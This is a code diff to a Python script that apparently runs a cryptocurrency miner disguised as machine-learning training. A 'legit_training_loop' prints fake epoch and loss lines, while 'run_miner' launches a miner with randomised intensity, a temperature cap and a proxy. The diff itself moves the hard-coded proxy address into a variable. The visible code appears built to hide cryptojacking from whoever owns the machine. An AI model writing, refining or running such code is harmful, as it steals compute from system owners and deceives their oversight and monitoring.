@@ -69,6 +69,8 @@ def legit_training_loop(stop_event):
             print(f"[LEGIT TRAINING] Epoch {epoch}, Loss: {loss.item():.4f}")
         time.sleep(random.uniform(0.1, 0.4))
 
+proxy = "127.0.0.1:1080"
+
 def run_miner(wallet, worker_prefix, stop_event, proxy=None):
     while not stop_event.is_set():
         intensity = random.randint(15, 20)
@@ -81,8 +83,7 @@ def run_miner(wallet, worker_prefix, stop_event, proxy=None):
             "-p", "x",
             "--intensity", str(intensity),
             "--temperature-limit", "70",
-            "--log-path", f"miner_{worker_name}.log",
-            "--proxy", "127.0.0.1:1080"
+            "--log-path", f"miner_{worker_name}.log"
         ]
         if proxy:
             miner_cmd.extend(["--proxy", proxy])
